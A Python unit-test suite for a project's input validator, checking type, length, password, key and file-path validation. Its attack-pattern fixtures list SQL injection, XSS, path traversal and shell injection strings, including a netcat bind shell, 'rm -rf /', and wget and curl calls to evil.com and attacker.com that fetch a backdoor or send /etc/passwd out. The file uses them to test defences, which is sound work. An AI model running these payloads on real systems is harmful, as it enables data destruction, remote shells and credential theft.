"""
Comprehensive Validation Testing Suite for BAR Project

This test suite provides thorough testing of all validation functions,
including edge cases, malicious inputs, and security scenarios as per
BAR Rules R030 - Input Validation.

Security Test Categories:
- Basic validation functionality
- Attack pattern detection and blocking
- Edge case handling
- Performance and timing attack resistance
- Memory safety validation
- Configuration validation
- File operation validation
- Cryptographic parameter validation

Per BAR Rules R030:
- NEVER trust any external input without validation
- NEVER use string concatenation for SQL-like operations  
- NEVER allow arbitrary code execution through user input
- NEVER bypass security checks for "convenience"

Author: Rolan Lobo (RNR)
Version: 2.0.0
Last Updated: January 2025
"""

import os
import sys
import unittest
import tempfile
import shutil
import time
import threading
from pathlib import Path
from unittest.mock import patch, MagicMock
from typing import List, Dict, Any, Optional

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

try:
    from security.input_validator import (
        InputValidator, ValidationConfig, ValidationLevel, ValidationResult,
        ValidationError, CryptographicValidationError, FileValidationError,
        MemoryValidationError, ConfigValidationError,
        get_global_validator, get_crypto_validator, get_file_validator,
        validate_string, validate_bytes, validate_integer,
        validate_encryption_key, validate_password, validate_file_path, validate_filename
    )
    VALIDATION_MODULE_AVAILABLE = True
except ImportError as e:
    print(f"⚠️ Validation module not available: {e}")
    VALIDATION_MODULE_AVAILABLE = False


class ValidationTestCase(unittest.TestCase):
    """Base test case with common validation testing utilities."""
    
    def setUp(self):
        """Set up test environment."""
        if not VALIDATION_MODULE_AVAILABLE:
            self.skipTest("Validation module not available")
        
        self.config = ValidationConfig(level=ValidationLevel.STRICT, log_violations=False)
        self.validator = InputValidator(self.config)
        self.temp_dir = tempfile.mkdtemp()
    
    def tearDown(self):
        """Clean up test environment."""
        if hasattr(self, 'temp_dir') and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def assert_validation_fails(self, result: ValidationResult, expected_violation: str = None):
        """Assert that validation failed with expected violation type."""
        self.assertFalse(result.is_valid, "Expected validation to fail")
        if expected_violation:
            self.assertEqual(result.violation_type, expected_violation)
        self.assertIn(result.security_risk_level, ["medium", "high", "critical"])
    
    def assert_validation_succeeds(self, result: ValidationResult, expected_value: Any = None):
        """Assert that validation succeeded with expected sanitized value."""
        self.assertTrue(result.is_valid, f"Expected validation to succeed: {result.error_message}")
        if expected_value is not None:
            self.assertEqual(result.sanitized_value, expected_value)
        self.assertEqual(result.security_risk_level, "low")


class TestBasicValidation(ValidationTestCase):
    """Test basic validation functionality."""
    
    def test_string_validation_basic(self):
        """Test basic string validation."""
        # Valid strings
        result = self.validator.validate_string("hello world", field_name="test_string")
        self.assert_validation_succeeds(result, "hello world")
        
        result = self.validator.validate_string("", field_name="empty_string", allow_empty=True)
        self.assert_validation_succeeds(result, "")
        
        # Invalid types
        result = self.validator.validate_string(123, field_name="number_as_string")
        self.assert_validation_fails(result, "type_error")
        
        result = self.validator.validate_string(None, field_name="none_string")
        self.assert_validation_fails(result, "type_error")
    
    def test_string_length_limits(self):
        """Test string length validation."""
        # Test maximum length
        long_string = "x" * (self.validator.MAX_SAFE_STRING_LENGTH + 1)
        result = self.validator.validate_string(long_string, field_name="long_string")
        self.assert_validation_fails(result, "length_exceeded")
        
        # Test custom max length
        result = self.validator.validate_string("toolong", field_name="custom_max", max_length=5)
        self.assert_validation_fails(result, "length_exceeded")
        
        # Test minimum length
        result = self.validator.validate_string("ab", field_name="short_string", min_length=5)
        self.assert_validation_fails(result, "length_insufficient")
    
    def test_integer_validation(self):
        """Test integer validation."""
        # Valid integers
        result = self.validator.validate_integer(42, field_name="valid_int")
        self.assert_validation_succeeds(result, 42)
        
        result = self.validator.validate_integer("123", field_name="string_int")
        self.assert_validation_succeeds(result, 123)
        
        # Invalid integers
        result = self.validator.validate_integer("not_a_number", field_name="invalid_int")
        self.assert_validation_fails(result, "type_error")
        
        result = self.validator.validate_integer(3.14, field_name="float_int")
        self.assert_validation_fails(result, "type_error")
    
    def test_integer_range_limits(self):
        """Test integer range validation."""
        # Test range limits
        result = self.validator.validate_integer(150, field_name="range_test", min_value=100, max_value=200)
        self.assert_validation_succeeds(result, 150)
        
        result = self.validator.validate_integer(50, field_name="below_range", min_value=100, max_value=200)
        self.assert_validation_fails(result, "range_error")
        
        result = self.validator.validate_integer(250, field_name="above_range", min_value=100, max_value=200)
        self.assert_validation_fails(result, "range_error")
        
        # Test safe integer limits
        unsafe_large = self.validator.MAX_SAFE_INTEGER + 1
        result = self.validator.validate_integer(unsafe_large, field_name="unsafe_large")
        self.assert_validation_fails(result, "range_error")
    
    def test_bytes_validation(self):
        """Test bytes validation."""
        # Valid bytes
        test_bytes = b"hello world"
        result = self.validator.validate_bytes(test_bytes, field_name="valid_bytes")
        self.assert_validation_succeeds(result, test_bytes)
        
        # String to bytes conversion
        result = self.validator.validate_bytes("hello", field_name="string_to_bytes")
        self.assert_validation_succeeds(result, b"hello")
        
        # Invalid types
        result = self.validator.validate_bytes(123, field_name="invalid_bytes")
        self.assert_validation_fails(result, "type_error")


class TestSecurityValidation(ValidationTestCase):
    """Test security-focused validation including attack pattern detection."""
    
    def get_attack_patterns(self) -> Dict[str, List[str]]:
        """Get comprehensive list of attack patterns to test."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; SELECT * FROM passwords; --",
                "admin'--",
                "' UNION SELECT null, username, password FROM users--",
                "; DELETE FROM files WHERE 1=1;",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            "command_injection": [
                "$(rm -rf /)",
                "`cat /etc/passwd`",
                "; rm -rf *",
                "| nc -l -p 1234 -e /bin/bash",
                "&& shutdown -h now",
                "$(wget http://malicious.com/script.sh)",
                "; curl http://attacker.com/steal?data=`cat /etc/passwd`"
            ],
            "script_injection": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "..\\..\\..\\boot.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            "format_string": [
                "%x%x%x%x%x%x",
                "%s%s%s%s%s%s",
                "%n%n%n%n%n%n",
                "{0.__class__.__bases__[0].__subclasses__()}",
                "%{1000000000d}",
                "%.1000000000d",
                "%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*%*"
            ],
            "buffer_overflow": [
                "A" * 10000,
                "\x90" * 1000 + "\xcc" * 4,
                "\x00" * 5000,
                "\xff" * 8192,
                "\\x41\\x41\\x41\\x41" * 1000
            ],
            "unicode_attacks": [
                "\u202e\u0041\u0042\u0043",  # Right-to-left override
                "\ufeff" + "malicious",      # Byte order mark
                "\u200b" + "invisible",      # Zero width space
                "\u2028\u2029",              # Line/paragraph separators
                "\uff0e\uff0e\uff0f",        # Fullwidth path traversal
            ],
            "null_byte": [
                "file.txt\x00.exe",
                "safe\x00malicious",
                "\x00\x01\x02\x03",
                "normal_text\x00<script>alert('xss')</script>"
            ]
        }
    
    def test_sql_injection_detection(self):
        """Test SQL injection attack detection."""
        patterns = self.get_attack_patterns()["sql_injection"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="sql_test")
                self.assert_validation_fails(result, "security_violation")
                self.assertIn(result.security_risk_level, ["high", "critical"])
    
    def test_command_injection_detection(self):
        """Test command injection attack detection."""
        patterns = self.get_attack_patterns()["command_injection"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="cmd_test")
                self.assert_validation_fails(result, "security_violation")
                self.assertIn(result.security_risk_level, ["high", "critical"])
    
    def test_script_injection_detection(self):
        """Test script injection attack detection."""
        patterns = self.get_attack_patterns()["script_injection"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="script_test")
                self.assert_validation_fails(result, "security_violation")
                self.assertIn(result.security_risk_level, ["high", "critical"])
    
    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        patterns = self.get_attack_patterns()["path_traversal"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="path_test")
                self.assert_validation_fails(result, "security_violation")
                self.assertIn(result.security_risk_level, ["high", "critical"])
    
    def test_format_string_detection(self):
        """Test format string attack detection."""
        patterns = self.get_attack_patterns()["format_string"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="format_test")
                self.assert_validation_fails(result, "security_violation")
                self.assertIn(result.security_risk_level, ["high", "critical"])
    
    def test_buffer_overflow_detection(self):
        """Test buffer overflow attack detection."""
        patterns = self.get_attack_patterns()["buffer_overflow"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="buffer_test")
                self.assert_validation_fails(result)  # Should fail due to length or pattern
    
    def test_unicode_attack_detection(self):
        """Test Unicode-based attack detection."""
        patterns = self.get_attack_patterns()["unicode_attacks"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(
                    pattern, field_name="unicode_test", 
                    strict_encoding=True, normalize_unicode=True
                )
                # Should either fail or be properly normalized
                if result.is_valid:
                    self.assertNotEqual(result.sanitized_value, pattern)
    
    def test_null_byte_detection(self):
        """Test null byte injection detection."""
        patterns = self.get_attack_patterns()["null_byte"]
        
        for pattern in patterns:
            with self.subTest(pattern=pattern):
                result = self.validator.validate_string(pattern, field_name="null_test")
                self.assert_validation_fails(result, "security_violation")


class TestCryptographicValidation(ValidationTestCase):
    """Test cryptographic parameter validation."""
    
    def setUp(self):
        """Set up crypto validator."""
        super().setUp()
        if VALIDATION_MODULE_AVAILABLE:
            self.crypto_validator = get_crypto_validator()
    
    def test_password_strength_validation(self):
        """Test password strength validation."""
        # Strong passwords that should pass
        strong_passwords = [
            "MySecur3P@ssw0rd!",
            "C0mpl3x#P@ssw0rd123",
            "Sup3r$3cur3P@$$w0rd!"
        ]
        
        for password in strong_passwords:
            with self.subTest(password=password):
                result = self.crypto_validator.validate_password(
                    password, field_name="strong_pwd", require_complexity=True
                )
                self.assert_validation_succeeds(result)
        
        # Weak passwords that should fail
        weak_passwords = [
            "password",          # No uppercase, numbers, special chars
            "PASSWORD",          # No lowercase, numbers, special chars
            "12345678",          # No letters, special chars
            "Pass1",             # Too short
            "password123",       # No uppercase, special chars
            "PASSWORD!",         # No lowercase, numbers
            "",                  # Empty
            " " * 10            # Whitespace only
        ]
        
        for password in weak_passwords:
            with self.subTest(password=password):
                result = self.crypto_validator.validate_password(
                    password, field_name="weak_pwd", require_complexity=True
                )
                self.assert_validation_fails(result, "password_weak")
    
    def test_encryption_key_validation(self):
        """Test encryption key validation."""
        # Valid keys
        valid_key_128 = os.urandom(16)  # 128-bit key
        result = self.crypto_validator.validate_encryption_key(
            valid_key_128, field_name="key_128", expected_length=16
        )
        self.assert_validation_succeeds(result)
        
        valid_key_256 = os.urandom(32)  # 256-bit key
        result = self.crypto_validator.validate_encryption_key(
            valid_key_256, field_name="key_256", expected_length=32
        )
        self.assert_validation_succeeds(result)
        
        # Invalid keys
        # Wrong length
        result = self.crypto_validator.validate_encryption_key(
            os.urandom(15), field_name="key_wrong_len", expected_length=16
        )
        self.assert_validation_fails(result, "invalid_key_length")
        
        # Weak key (all zeros)
        weak_key = b'\x00' * 32
        result = self.crypto_validator.validate_encryption_key(
            weak_key, field_name="weak_key", check_entropy=True
        )
        self.assert_validation_fails(result, "weak_key")
        
        # Invalid type
        result = self.crypto_validator.validate_encryption_key(
            "not_bytes", field_name="key_type_error"
        )
        self.assert_validation_fails(result, "type_error")
    
    def test_hash_validation(self):
        """Test cryptographic hash validation."""
        # Valid hashes
        import hashlib
        test_data = b"test data"
        
        sha256_hash = hashlib.sha256(test_data).hexdigest()
        result = self.crypto_validator.validate_hash(
            sha256_hash, field_name="sha256_hash", algorithm="sha256"
        )
        self.assert_validation_succeeds(result)
        
        # Invalid hashes
        result = self.crypto_validator.validate_hash(
            "invalid_hash", field_name="bad_hash", algorithm="sha256"
        )
        self.assert_validation_fails(result, "invalid_hash_format")


class TestFileValidation(ValidationTestCase):
    """Test file operation validation."""
    
    def setUp(self):
        """Set up file validator."""
        super().setUp()
        if VALIDATION_MODULE_AVAILABLE:
            self.file_validator = get_file_validator()
    
    def test_filename_validation(self):
        """Test filename validation."""
        # Valid filenames
        valid_filenames = [
            "document.txt",
            "my-file_2025.pdf",
            "report (final).docx",
            "image-001.jpg"
        ]
        
        for filename in valid_filenames:
            with self.subTest(filename=filename):
                result = self.file_validator.validate_filename(filename, field_name="valid_file")
                self.assert_validation_succeeds(result)
        
        # Invalid filenames
        invalid_filenames = [
            "",                    # Empty
            ".",                   # Current directory
            "..",                  # Parent directory
            "con.txt",             # Windows reserved
            "file<script>.txt",    # Dangerous characters
            "file\x00.exe",        # Null byte injection
            "file|with|pipes.txt", # Pipe characters
            "a" * 300 + ".txt"     # Too long
        ]
        
        for filename in invalid_filenames:
            with self.subTest(filename=filename):
                result = self.file_validator.validate_filename(filename, field_name="invalid_file")
                self.assert_validation_fails(result)
    
    def test_file_path_validation(self):
        """Test file path validation."""
        # Valid paths
        if os.name == 'nt':  # Windows
            valid_paths = [
                "C:\\Users\\Documents\\file.txt",
                "D:\\Projects\\BAR\\data.db",
                "\\\\server\\share\\file.txt"
            ]
        else:  # Unix-like
            valid_paths = [
                "/home/user/documents/file.txt",
                "/tmp/secure_file.dat",
                "/opt/BAR/config.json"
            ]
        
        for path in valid_paths:
            with self.subTest(path=path):
                result = self.file_validator.validate_file_path(
                    path, field_name="valid_path", allow_absolute=True
                )
                self.assert_validation_succeeds(result)
        
        # Invalid paths (path traversal attempts)
        invalid_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "file/../../secret.txt",
            "\\\\..\\admin$\\file.txt"
        ]
        
        for path in invalid_paths:
            with self.subTest(path=path):
                result = self.file_validator.validate_file_path(path, field_name="invalid_path")
                self.assert_validation_fails(result, "path_traversal")
    
    def test_file_size_validation(self):
        """Test file size validation."""
        # Valid sizes
        result = self.file_validator.validate_file_size("1024", field_name="size_valid")
        self.assert_validation_succeeds(result, 1024)
        
        result = self.file_validator.validate_file_size(1048576, field_name="size_1mb")  # 1MB
        self.assert_validation_succeeds(result, 1048576)
        
        # Invalid sizes
        result = self.file_validator.validate_file_size(-1, field_name="size_negative")
        self.assert_validation_fails(result, "range_error")
        
        result = self.file_validator.validate_file_size("not_a_number", field_name="size_invalid")
        self.assert_validation_fails(result, "type_error")
        
        # Too large
        huge_size = self.file_validator.MAX_FILE_SIZES['default'] + 1
        result = self.file_validator.validate_file_size(huge_size, field_name="size_too_large")
        self.assert_validation_fails(result, "file_size_exceeded")


class TestPerformanceAndSecurity(ValidationTestCase):
    """Test performance characteristics and timing attack resistance."""
    
    def test_timing_attack_resistance(self):
        """Test that validation timing is consistent to prevent timing attacks."""
        test_strings = [
            "valid_string",
            "'; DROP TABLE users; --",
            "A" * 1000,
            "<script>alert('xss')</script>"
        ]
        
        times = []
        
        for test_string in test_strings:
            start_time = time.perf_counter()
            result = self.validator.validate_string(test_string, field_name="timing_test")
            end_time = time.perf_counter()
            times.append(end_time - start_time)
        
        # Check that timing variations are not excessive
        max_time = max(times)
        min_time = min(times)
        
        # Allow for some variation but not orders of magnitude
        if min_time > 0:
            ratio = max_time / min_time
            self.assertLess(ratio, 10, "Timing variation too large - potential timing attack vector")
    
    def test_concurrent_validation(self):
        """Test validation under concurrent access."""
        results = []
        errors = []
        
        def validate_worker(test_id: int):
            try:
                for i in range(100):
                    test_string = f"test_string_{test_id}_{i}"
                    result = self.validator.validate_string(test_string, field_name=f"concurrent_{test_id}")
                    results.append((test_id, i, result.is_valid))
            except Exception as e:
                errors.append((test_id, str(e)))
        
        # Create multiple threads
        threads = []
        for thread_id in range(5):
            thread = threading.Thread(target=validate_worker, args=(thread_id,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Check results
        self.assertEqual(len(errors), 0, f"Validation errors in concurrent test: {errors}")
        self.assertEqual(len(results), 500, "Not all validations completed")
        
        # All validation results should be successful for valid strings
        failed_validations = [r for r in results if not r[2]]
        self.assertEqual(len(failed_validations), 0, f"Unexpected validation failures: {failed_validations}")
    
    def test_memory_usage_bounds(self):
        """Test that validation doesn't consume excessive memory."""
        import psutil
        import gc
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform many validations
        for i in range(1000):
            large_string = "x" * 10000  # 10KB string
            result = self.validator.validate_string(large_string, field_name=f"memory_test_{i}")
            
            # Clear references to avoid accumulation
            del large_string
            del result
        
        # Force garbage collection
        gc.collect()
        
        final_memory = process.memory_info().rss
        memory_growth = final_memory - initial_memory
        
        # Memory growth should be reasonable (less than 50MB)
        max_acceptable_growth = 50 * 1024 * 1024  # 50MB
        self.assertLess(memory_growth, max_acceptable_growth, 
                       f"Memory growth too large: {memory_growth / 1024 / 1024:.2f} MB")


class TestEdgeCases(ValidationTestCase):
    """Test edge cases and boundary conditions."""
    
    def test_empty_input_handling(self):
        """Test handling of empty inputs."""
        # Empty string with allow_empty=True
        result = self.validator.validate_string("", field_name="empty_allowed", allow_empty=True)
        self.assert_validation_succeeds(result, "")
        
        # Empty string with allow_empty=False
        result = self.validator.validate_string("", field_name="empty_not_allowed", allow_empty=False)
        self.assert_validation_fails(result, "empty_value")
        
        # Whitespace-only string
        result = self.validator.validate_string("   ", field_name="whitespace_only")
        # Should either be rejected or normalized to empty
        if result.is_valid:
            self.assertEqual(result.sanitized_value.strip(), "")
    
    def test_boundary_values(self):
        """Test boundary value conditions."""
        # String length boundaries
        max_len = 100
        boundary_string = "x" * max_len
        result = self.validator.validate_string(boundary_string, field_name="boundary", max_length=max_len)
        self.assert_validation_succeeds(result)
        
        over_boundary = "x" * (max_len + 1)
        result = self.validator.validate_string(over_boundary, field_name="over_boundary", max_length=max_len)
        self.assert_validation_fails(result, "length_exceeded")
        
        # Integer boundaries
        result = self.validator.validate_integer(0, field_name="zero")
        self.assert_validation_succeeds(result, 0)
        
        result = self.validator.validate_integer(-1, field_name="negative", allow_negative=True)
        self.assert_validation_succeeds(result, -1)
        
        result = self.validator.validate_integer(-1, field_name="negative_not_allowed", allow_negative=False)
        self.assert_validation_fails(result, "range_error")
    
    def test_unicode_handling(self):
        """Test proper Unicode handling."""
        unicode_strings = [
            "Hello, 世界!",           # Mixed ASCII and Chinese
            "café résumé naïve",      # Accented characters
            "🔒🔑💻🚨",                # Emojis
            "Здравствуй мир",         # Cyrillic
            "مرحبا بالعالم",           # Arabic
            "\u0041\u0300",           # Combining characters
        ]
        
        for unicode_string in unicode_strings:
            with self.subTest(string=unicode_string):
                result = self.validator.validate_string(
                    unicode_string, field_name="unicode_test", 
                    allow_unicode=True, normalize_unicode=True
                )
                self.assert_validation_succeeds(result)
                # Result should be properly normalized
                self.assertIsInstance(result.sanitized_value, str)
    
    def test_malformed_input_handling(self):
        """Test handling of malformed or corrupted input."""
        malformed_inputs = [
            b"\xff\xfe\x00\x00",     # Invalid UTF-8
            "\udcff",                 # Surrogate character
            "text\x00with\x00nulls",  # Embedded nulls
            "text\r\nwith\r\nCRLF",   # Line endings
            "\t\n\r\v\f",             # Control characters
        ]
        
        for malformed in malformed_inputs:
            with self.subTest(input=repr(malformed)):
                try:
                    result = self.validator.validate_string(malformed, field_name="malformed_test")
                    # Should either fail or be sanitized
                    if result.is_valid:
                        self.assertNotEqual(result.sanitized_value, malformed)
                except Exception as e:
                    # Exceptions are acceptable for truly malformed input
                    self.assertIsInstance(e, (ValidationError, UnicodeError, ValueError))


class TestConvenienceFunctions(ValidationTestCase):
    """Test convenience functions and global validators."""
    
    def test_global_validator_functions(self):
        """Test global convenience functions."""
        # String validation
        result = validate_string("test", field_name="convenience_test")
        self.assertTrue(result.is_valid)
        
        # Integer validation
        result = validate_integer(42, field_name="convenience_int")
        self.assertTrue(result.is_valid)
        
        # Bytes validation
        result = validate_bytes(b"test", field_name="convenience_bytes")
        self.assertTrue(result.is_valid)
    
    def test_validator_singleton_behavior(self):
        """Test that global validators behave as singletons."""
        validator1 = get_global_validator()
        validator2 = get_global_validator()
        self.assertIs(validator1, validator2, "Global validator should be singleton")
        
        crypto1 = get_crypto_validator()
        crypto2 = get_crypto_validator()
        self.assertIs(crypto1, crypto2, "Crypto validator should be singleton")
        
        file1 = get_file_validator()
        file2 = get_file_validator()
        self.assertIs(file1, file2, "File validator should be singleton")


class TestIntegration(ValidationTestCase):
    """Integration tests for complete validation workflows."""
    
    def test_complete_user_input_validation(self):
        """Test complete user input validation workflow."""
        # Simulate a complete user registration form
        user_data = {
            "username": "testuser123",
            "email": "test@example.com",
            "password": "SecureP@ssw0rd123!",
            "confirm_password": "SecureP@ssw0rd123!",
            "device_name": "SecureDevice-2025",
            "backup_path": "/secure/backup/location"
        }
        
        # Validate each field
        validations = {}
        
        # Username
        result = validate_string(user_data["username"], field_name="username", max_length=50)
        validations["username"] = result
        self.assert_validation_succeeds(result)
        
        # Email (basic validation)
        result = validate_string(user_data["email"], field_name="email", max_length=100)
        validations["email"] = result
        self.assert_validation_succeeds(result)
        
        # Password
        result = validate_password(user_data["password"], field_name="password", require_complexity=True)
        validations["password"] = result
        self.assert_validation_succeeds(result)
        
        # Device name
        result = validate_string(
            user_data["device_name"], field_name="device_name", max_length=50,
            allowed_chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_."
        )
        validations["device_name"] = result
        self.assert_validation_succeeds(result)
        
        # File path
        result = validate_file_path(user_data["backup_path"], field_name="backup_path", allow_absolute=True)
        validations["backup_path"] = result
        self.assert_validation_succeeds(result)
        
        # All validations should succeed
        all_valid = all(v.is_valid for v in validations.values())
        self.assertTrue(all_valid, "All user input validations should succeed")
    
    def test_attack_scenario_detection(self):
        """Test detection of coordinated attack scenarios."""
        # Simulate an attacker trying multiple injection vectors
        attack_inputs = {
            "username": "'; DROP TABLE users; --",
            "email": "<script>window.location='http://evil.com'</script>",
            "password": "$(wget http://evil.com/backdoor.sh)",
            "device_name": "../../../etc/passwd",
            "backup_path": "|nc -l 4444 -e /bin/bash"
        }
        
        attack_detected = False
        
        for field, value in attack_inputs.items():
            result = validate_string(value, field_name=field)
            if not result.is_valid and result.security_risk_level in ["high", "critical"]:
                attack_detected = True
                break
        
        self.assertTrue(attack_detected, "Attack patterns should be detected")


def run_validation_tests():
    """Run all validation tests and return results."""
    if not VALIDATION_MODULE_AVAILABLE:
        print("❌ Validation module not available - cannot run tests")
        return False
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestBasicValidation,
        TestSecurityValidation,
        TestCryptographicValidation,
        TestFileValidation,
        TestPerformanceAndSecurity,
        TestEdgeCases,
        TestConvenienceFunctions,
        TestIntegration
    ]
    
    for test_class in test_classes:
        tests = loader.loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2, buffer=True)
    result = runner.run(suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"VALIDATION TEST SUMMARY")
    print(f"{'='*60}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print(f"\n❌ FAILURES ({len(result.failures)}):")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback.split('AssertionError: ')[-1].split('\\n')[0]}")
    
    if result.errors:
        print(f"\n💥 ERRORS ({len(result.errors)}):")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback.split('\\n')[-2]}")
    
    success = len(result.failures) == 0 and len(result.errors) == 0
    if success:
        print("\n✅ All validation tests passed!")
    else:
        print(f"\n❌ Some tests failed. Please review and fix issues.")
    
    return success


if __name__ == "__main__":
    # Run tests when script is executed directly
    success = run_validation_tests()
    sys.exit(0 if success else 1)